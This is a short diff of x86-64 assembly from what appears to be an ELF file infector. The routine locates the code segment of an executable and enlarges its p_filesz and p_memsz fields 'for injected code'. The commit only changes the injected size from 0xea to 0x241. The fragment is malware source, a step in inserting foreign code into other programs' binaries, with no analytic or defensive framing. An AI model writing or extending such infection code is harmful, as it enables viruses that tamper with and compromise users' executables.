@@ -170,11 +170,11 @@ find_code_segment:
 
     mov     rax, [rbx + Elf64_Phdr.p_filesz]   ; Size of the segment in file
     mov     [code_segment_size], rax
-    add     rax, 0xea                          ; Patch p_filesz for injected code
+    add     rax, 0x241                          ; Patch p_filesz for injected code
     mov     [rbx + Elf64_Phdr.p_filesz], rax
 
     mov     rax, [rbx + Elf64_Phdr.p_memsz]    ; Patch p_memsz for injected code
-    add     rax, 0xea
+    add     rax, 0x241
     mov     [rbx + Elf64_Phdr.p_memsz], rax
 
     mov     rax, [rbx + Elf64_Phdr.p_vaddr]    ; Virtual address of this segment
